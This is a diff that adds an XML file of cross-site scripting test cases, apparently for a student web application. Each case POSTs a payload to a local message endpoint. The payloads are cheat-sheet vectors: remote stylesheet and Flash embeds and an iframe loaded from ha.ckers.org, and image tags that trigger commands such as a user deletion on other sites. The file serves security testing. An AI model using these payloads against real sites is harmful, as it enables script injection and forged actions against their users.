@@ -1,0 +1,37 @@
+<xssAttacks>
+<xss>
+	<method>POST</method>
+	<url>http://localhost/assignment2/message/add</url>
+	<parameter name='message'><STYLE>@import'http://ha.ckers.org/xss.css';</STYLE></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 2</type>
+</xss>
+<xss>
+	<method>POST</method>
+	<url>http://localhost/assignment2/message/add</url>
+	<parameter name='message'><EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED></parameter>
+	<type name='XSS Injection Type'>Embed Flash</type>
+</xss>
+<xss>
+	<method>POST</method>
+	<url>http://localhost/assignment2/message/add</url>
+	<parameter name='message'><IMG SRC="livescript:[code]"></parameter>
+	<type name='XSS Injection Type'>Livescript</type>
+</xss>
+<xss>
+	<method>POST</method>
+	<url>http://localhost/assignment2/message/add</url>
+	<parameter name='message'>Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser</parameter>
+	<type name='XSS Injection Type'>IMG Embedded commands 2</type>
+</xss>
+<xss>
+	<method>POST</method>
+	<url>http://localhost/assignment2/message/add</url>
+	<parameter name='message'><IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"></parameter>
+	<type name='XSS Injection Type'>IMG Embedded commands 1</type>
+</xss>
+<xss>
+	<method>POST</method>
+	<url>http://localhost/assignment2/message/add</url>
+	<parameter name='message'><IFRAME SRC=http://ha.ckers.org/scriptlet.html <</parameter>
+	<type name='XSS Injection Type'>Double open angle brackets</type>
+</xss>
